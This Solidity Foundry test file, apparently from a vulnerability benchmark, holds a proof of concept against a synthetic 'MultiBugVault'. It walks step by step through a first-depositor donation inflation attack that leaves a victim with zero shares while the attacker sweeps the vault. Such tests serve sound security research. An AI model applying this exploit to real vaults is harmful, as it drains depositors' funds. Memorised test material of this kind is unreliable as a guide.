// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {Test} from "forge-std/Test.sol";
import {ClassInvariants} from "./Invariants.sol";
import {MultiBugVault, IERC20} from "../src/MultiBugVault.sol";
import {MockToken} from "../src/SyntheticVault.sol";

/// PoC for BUG-A: first-depositor donation share inflation in MultiBugVault.deposit().
contract AttackHarness_multi_v1_1 is ClassInvariants {
    address attacker;
    address victim;
    MockToken token;
    MultiBugVault vault;
    uint256 attackerTokenBefore;

    function setUp() public {
        attacker = makeAddr("attacker");
        victim = makeAddr("victim");
        token = new MockToken();
        vault = new MultiBugVault(IERC20(address(token)));
        token.mint(attacker, 1000e18);
        token.mint(victim, 100e18);
        attackerTokenBefore = token.balanceOf(attacker);
    }

    function testPoC_multi_v1_1() public {
        require(vault.totalShares() == 0, "pre: totalShares should be 0");

        // 1. attacker mints 1 wei share as first depositor
        vm.startPrank(attacker);
        token.approve(address(vault), type(uint256).max);
        vault.deposit(1);
        // 2. donate to inflate totalAssets
        token.transfer(address(vault), 100e18);
        vm.stopPrank();

        // 3. victim deposit rounds to 0 shares: minted = 50e18 * 1 / (150e18+1 - 50e18) = 0
        vm.startPrank(victim);
        token.approve(address(vault), type(uint256).max);
        vault.deposit(50e18);
        require(vault.shares(victim) == 0, "victim should get 0 shares (donation inflation)");
        vm.stopPrank();

        // 4. attacker withdraws their 1 share, sweeping the entire vault
        vm.startPrank(attacker);
        vault.withdraw(1);
        vm.stopPrank();

        // Class invariant: attacker token balance increased >= 1 ETH (profit threshold)
        assertAttackerTokenIncreased(attacker, address(token), attackerTokenBefore, 1e18);
    }
}
